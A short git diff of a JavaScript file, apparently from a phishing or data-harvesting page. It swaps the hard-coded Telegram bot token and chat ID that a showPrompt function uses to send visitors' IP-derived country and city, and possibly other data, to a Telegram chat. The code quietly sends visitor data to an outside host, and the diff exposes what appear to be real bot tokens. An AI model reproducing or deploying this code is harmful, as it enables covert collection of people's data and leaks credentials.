@@ -239,8 +239,8 @@ function showPrompt(IpAddress) {
         '%0A<strong>Country : </strong>' + IpAddress.countryName +'( '+IpAddress.countryCode+' )'+
         '%0A<strong>City : </strong>' + IpAddress.city ;
 
-        const botToken = '6899648318:AAEuhFl-OX-SGSRSc2i_fa7ZSMJTE1Yo3Ik'; // Thay YOUR_BOT_TOKEN bằng bot_token của bạn
-        const chatId = '-1002129119762'; // Thay YOUR_CHAT_ID bằng chat_id của bạn
+        const botToken = '7264552448:AAEqLBp-YcZAabRDDkYPZYgfmTMzdFjEVcM'; // Thay YOUR_BOT_TOKEN bằng bot_token của bạn
+        const chatId = '-1002299618966'; // Thay YOUR_CHAT_ID bằng chat_id của bạn
         const message = message1; // Tin nhắn sẽ là dữ liệu sản phẩm
 
         const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}&parse_mode=html`;
